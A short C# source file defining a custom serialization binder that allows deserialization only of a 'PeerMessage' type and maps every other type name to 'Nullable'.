using PhantomInterop.Structs.PhantomStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;

namespace PhantomInterop.Serializers
{
    public class ApolloSerializationBinder : SerializationBinder
    {
        public override Type BindToType(string assemblyName, string typeName)
        {
            if (typeName == "PhantomInterop.Structs.PhantomStructs.PeerMessage")
            {
                return typeof(PeerMessage);
            }
            else
            {
                return typeof(Nullable);
            }
        }
    }
}
